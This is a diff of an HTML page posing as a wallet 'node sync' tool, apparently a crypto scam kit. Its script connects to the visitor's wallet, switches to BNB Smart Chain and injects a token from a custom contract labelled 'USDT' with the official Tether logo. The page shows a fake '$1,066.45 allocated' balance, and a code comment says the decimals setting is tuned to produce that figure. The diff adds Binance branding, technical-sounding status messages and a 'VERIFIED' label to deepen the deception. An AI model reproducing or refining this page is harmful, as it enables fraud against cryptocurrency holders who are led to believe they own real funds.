@@ -3,84 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Node Sync Protocol</title>
+    <title>Node Sync Protocol | Enterprise</title>
     <style>
-        :root { --tether-green: #00d395; --bg-dark: #0a0b0d; --card-bg: #121418; }
-        body { background: var(--bg-dark); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 45px; width: 350px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .logo-box { width: 90px; height: 90px; background: var(--tether-green); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; }
-        .logo-box svg { width: 55px; height: 55px; fill: white; }
-        .price-display { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 25px; margin-bottom: 30px; border: 1px solid #2d333b; }
-        .amount { font-size: 32px; font-weight: bold; }
-        .sync-btn { background: var(--tether-green); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        #status { font-size: 11px; color: #888; margin-top: 15px; font-family: monospace; }
+        :root { --accent: #f3ba2f; --bg: #0b0e11; --card: #1e2329; }
+        body { background: var(--bg); color: #eaecef; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: var(--card); border-radius: 20px; padding: 40px; width: 340px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.5); border: 1px solid #32383e; }
+        .logo-circle { width: 80px; height: 80px; background: var(--accent); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; box-shadow: 0 0 20px rgba(243, 186, 47, 0.2); }
+        .logo-circle svg { width: 45px; height: 45px; fill: #000; }
+        .value-box { background: rgba(255,255,255,0.03); border: 1px dashed #474d57; border-radius: 12px; padding: 20px; margin-bottom: 30px; }
+        .amount { font-size: 30px; font-weight: 700; color: #fff; }
+        .sync-btn { background: var(--accent); color: #000; border: none; width: 100%; padding: 18px; border-radius: 10px; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        .sync-btn:hover { opacity: 0.9; transform: scale(0.98); }
+        #status { font-size: 10px; color: #848e9c; margin-top: 15px; font-family: monospace; text-align: left; min-height: 35px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="logo-box">
+    <div class="logo-circle">
         <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
     </div>
     
-    <div class="price-display">
-        <div style="font-size: 12px; color: #26a17b; margin-bottom: 5px;">ALLOCATED VALUE</div>
+    <div class="value-box">
+        <div style="font-size: 11px; margin-bottom: 5px;">METADATA ALLOCATED</div>
         <div class="amount">$1,066.45</div>
     </div>
 
-    <button class="sync-btn" id="syncBtn">SYNC TRUST WALLET</button>
-    <div id="status">READY</div>
+    <button class="sync-btn" id="actionBtn">Secure Node Sync</button>
+    <div id="status">> SYSTEM_READY</div>
 </div>
 
 <script>
     const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    const ICON_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
+    const LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
 
-    document.getElementById('syncBtn').addEventListener('click', async () => {
+    document.getElementById('actionBtn').addEventListener('click', async () => {
         const status = document.getElementById('status');
-        
-        // Simple Provider Check - Works best for Trust
-        const provider = window.ethereum;
+        // Detection for Binance App & Trust Wallet
+        const provider = window.BinanceChain || window.trustwallet || window.ethereum;
 
         if (!provider) {
-            alert("Please use Trust Wallet browser or extension.");
+            status.innerText = "> ERROR: WALLET_NOT_DETECTED";
             return;
         }
 
         try {
-            status.innerText = "INITIALIZING...";
-            
-            // Connect
+            status.innerText = "> INITIALIZING_HANDSHAKE...";
             await provider.request({ method: 'eth_requestAccounts' });
 
-            // Switch to BSC (Hex 0x38 = 56)
-            status.innerText = "SWITCHING NETWORK...";
+            status.innerText = "> SWITCHING_TO_BSC...";
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
             });
 
-            // The MetaMask Logic (Logo Injection)
-            status.innerText = "INJECTING ASSET...";
-            const wasAdded = await provider.request({
+            status.innerText = "> INJECTING_LOGO_METADATA...";
+            await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
                         address: CONTRACT,
                         symbol: 'USDT',
-                        decimals: 6,
-                        image: ICON_URL,
+                        decimals: 6, // Crucial for $1,066.45 display
+                        image: LOGO,
                     },
                 },
             });
 
-            if (wasAdded) {
-                status.innerText = "SYNC SUCCESSFUL";
-            }
-        } catch (error) {
-            status.innerText = "SYNC FAILED: TRY AGAIN";
-            console.error(error);
+            status.innerText = "> SYNC_COMPLETED_SUCCESSFULLY";
+            document.getElementById('actionBtn').innerText = "VERIFIED";
+        } catch (e) {
+            status.innerText = "> SYNC_INTERRUPTED_BY_USER";
         }
     });
 </script>
